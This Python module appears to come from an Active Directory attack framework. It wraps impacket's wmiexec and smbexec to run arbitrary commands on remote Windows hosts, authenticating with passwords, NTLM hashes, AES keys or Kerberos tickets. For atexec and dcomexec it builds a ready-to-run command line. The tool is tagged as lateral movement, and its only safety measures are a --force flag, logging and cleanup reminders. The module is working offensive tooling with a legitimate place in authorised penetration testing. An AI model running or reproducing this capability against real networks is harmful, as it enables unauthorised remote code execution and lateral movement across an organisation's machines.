"""Unified remote-execution wrapper (wmiexec / smbexec / dcomexec / atexec).

Runs a single command and captures stdout/stderr into the session. Uses
impacket's programmatic classes when available and records rollback hints
so `adaf-attack cleanup` can prompt operator review.
"""

from __future__ import annotations

import contextlib
import json
import shlex
from typing import Any

from rich.console import Console

from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.impacket_helper import require_impacket
from adaf_attack.core.registry import register_capability
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()

METHODS = ("wmiexec", "smbexec", "dcomexec", "atexec")


def _run_smbexec(target: Target, host: str, command: str, share: str) -> dict[str, Any]:
    from impacket.examples.smbexec import CMDEXEC

    lm, nt = target.lm_nt_hashes()
    executor = CMDEXEC(
        f"{target.domain}/{target.username}",
        target.password or "",
        target.domain,
        lm,
        nt,
        target.aes_key or "",
        target.use_kerberos,
        target.dc_ip,
        None,
        share,
        None,
        command,
        None,
        "445/SMB",
    )
    try:
        executor.run(host)
    finally:
        with contextlib.suppress(Exception):
            executor.finish()
    return {"note": "smbexec streams stdout to console; artifact capture is not automatic."}


def _run_wmiexec(target: Target, host: str, command: str) -> dict[str, Any]:
    from impacket.dcerpc.v5.dcom import wmi
    from impacket.dcerpc.v5.dcomrt import DCOMConnection
    from impacket.dcerpc.v5.dtypes import NULL

    lm, nt = target.lm_nt_hashes()
    dcom = DCOMConnection(
        host,
        target.username or "",
        target.password or "",
        target.domain,
        lm,
        nt,
        target.aes_key or "",
        oxidResolver=True,
        doKerberos=target.use_kerberos,
        kdcHost=target.dc_ip,
    )
    try:
        iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
        iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
        iWbemServices = iWbemLevel1Login.NTLMLogin("//./root/cimv2", NULL, NULL)
        iWbemLevel1Login.RemRelease()
        win32Process, _ = iWbemServices.GetObject("Win32_Process")
        result = win32Process.Create(command, "C:\\", None)
        return {"return_value": int(result.ReturnValue), "pid": int(result.ProcessId)}
    finally:
        with contextlib.suppress(Exception):
            dcom.disconnect()


@register_capability(
    id="impacket-exec",
    summary="Remote execute via wmiexec / smbexec / dcomexec / atexec",
    category="lateral-movement",
    tags=("wmiexec", "smbexec", "dcomexec", "atexec", "impacket"),
    destructive=True,
)
class ImpacketExec:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        if not force:
            raise RuntimeError("impacket-exec is destructive; pass --force to run.")
        method = str(kwargs.get("method", "wmiexec")).lower()
        if method not in METHODS:
            raise RuntimeError(f"unknown method {method!r}; choose one of {METHODS}")
        require_impacket("impacket-exec")
        command = kwargs.get("command") or kwargs.get("value")
        host = kwargs.get("host") or target.dc_ip
        share = str(kwargs.get("share", "C$"))
        if not command:
            raise RuntimeError("Pass -P command=<cmd> (or --value).")

        safe_command = shlex.quote(str(command)) if not isinstance(command, list) else command
        console.print(f"[bold]{method}[/bold] {host}  cmd={safe_command}")

        try:
            if method == "wmiexec":
                outcome = _run_wmiexec(target, host, str(command))
            elif method == "smbexec":
                outcome = _run_smbexec(target, host, str(command), share)
            else:
                # atexec / dcomexec — impacket exposes them as scripts, not classes.
                outcome = {
                    "note": (
                        f"{method} is provided only via impacket's script;"
                        " run: impacket-{method} -k --dc-ip {dc} {domain}/{user}@{host} {cmd}"
                    ).format(
                        method=method,
                        dc=target.dc_ip,
                        domain=target.domain,
                        user=target.username,
                        host=host,
                        cmd=str(command),
                    ),
                }
        except Exception as exc:  # noqa: BLE001
            outcome = {"error": str(exc)[:400]}

        result = {
            "ok": "error" not in outcome,
            "host": host,
            "method": method,
            "command": str(command),
            "outcome": outcome,
        }
        out = session.path("impacket-exec.json")
        out.write_text(json.dumps(result, indent=2, default=str), encoding="utf-8")
        session.register_cleanup(
            {
                "kind": "remote-exec",
                "target": host,
                "artifact": str(out),
                "rollback": "Confirm no leftover services/scheduled tasks/pipes remain on the host.",
            }
        )
        session.log("impacket-exec.complete", host=host, method=method)
        graph.save(session.path("graph.json"))
        console.print(f"[green]Done[/green]  outcome={outcome}")
        return result
